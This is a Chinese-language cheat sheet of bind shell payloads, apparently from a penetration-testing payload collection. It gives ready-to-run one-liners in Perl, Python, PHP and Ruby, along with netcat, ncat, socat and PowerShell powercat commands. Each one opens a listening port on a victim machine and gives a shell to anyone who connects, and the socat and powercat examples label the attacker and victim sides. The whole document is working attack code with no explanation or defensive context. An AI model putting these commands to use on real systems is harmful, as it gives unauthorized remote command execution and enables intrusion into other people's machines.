# 正向 Shell (Bind Shell)

## 目录 (Summary)

* [正向 Shell (Bind Shell)](#%e6%ad%a3%e5%90%91-shell-bind-shell)
    * [Perl](#perl)
    * [Python](#python)
    * [PHP](#php)
    * [Ruby](#ruby)
    * [传统版 Netcat (Netcat Traditional)](#%e4%bc%a0%e7%bb%9f%e7%89%88-netcat-netcat-traditional)
    * [OpenBSD 版 Netcat (Netcat OpenBsd)](#openbsd-%e7%89%88-netcat-netcat-openbsd)
    * [Ncat](#ncat)
    * [Socat](#socat)
    * [PowerShell](#powershell)

## Perl

```perl
perl -e 'use Socket;$p=51337;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));\
bind(S,sockaddr_in($p, INADDR_ANY));listen(S,SOMAXCONN);for(;$p=accept(C,S);\
close C){open(STDIN,">&C");open(STDOUT,">&C");open(STDERR,">&C");exec("/bin/bash -i");};'
```

## Python

单行命令 (Single line)：

```python
python -c 'exec("""import socket as s,subprocess as sp;s1=s.socket(s.AF_INET,s.SOCK_STREAM);s1.setsockopt(s.SOL_SOCKET,s.SO_REUSEADDR, 1);s1.bind(("0.0.0.0",51337));s1.listen(1);c,a=s1.accept();\nwhile True: d=c.recv(1024).decode();p=sp.Popen(d,shell=True,stdout=sp.PIPE,stderr=sp.PIPE,stdin=sp.PIPE);c.sendall(p.stdout.read()+p.stderr.read())""")'
```

展开版 (Expanded version)：

```python
import socket as s,subprocess as sp;

s1 = s.socket(s.AF_INET, s.SOCK_STREAM);
s1.setsockopt(s.SOL_SOCKET, s.SO_REUSEADDR, 1);
s1.bind(("0.0.0.0", 51337));
s1.listen(1);
c, a = s1.accept();

while True: 
    d = c.recv(1024).decode();
    p = sp.Popen(d, shell=True, stdout=sp.PIPE, stderr=sp.PIPE, stdin=sp.PIPE);
    c.sendall(p.stdout.read()+p.stderr.read())
```

## PHP

```php
php -r '$s=socket_create(AF_INET,SOCK_STREAM,SOL_TCP);socket_bind($s,"0.0.0.0",51337);\
socket_listen($s,1);$cl=socket_accept($s);while(1){if(!socket_write($cl,"$ ",2))exit;\
$in=socket_read($cl,100);$cmd=popen("$in","r");while(!feof($cmd)){$m=fgetc($cmd);\
    socket_write($cl,$m,strlen($m));}}'
```

## Ruby

```ruby
ruby -rsocket -e 'f=TCPServer.new(51337);s=f.accept;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",s,s,s)'
```

## 传统版 Netcat (Netcat Traditional)

```powershell
nc -nlvp 51337 -e /bin/bash
```

## OpenBSD 版 Netcat (Netcat OpenBsd)

```powershell
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc -lvp 51337 >/tmp/f
```

## Ncat

```powershell
ncat -nlvp 51337 -e /bin/bash
```

## Socat

```powershell
# 攻击者机 (attacker)
user@attacker$ socat FILE:`tty`,raw,echo=0 TCP:target.com:12345 

# 目标机 (victim)
user@victim$ socat TCP-LISTEN:12345,reuseaddr,fork EXEC:/bin/sh,pty,stderr,setsid,sigint,sane
```

## PowerShell

```powershell
https://github.com/besimorhino/powercat

# 目标机 (监听)
. .\powercat.ps1
powercat -l -p 7002 -ep

# 攻击者机 (连接)
. .\powercat.ps1
powercat -c 127.0.0.1 -p 7002
```
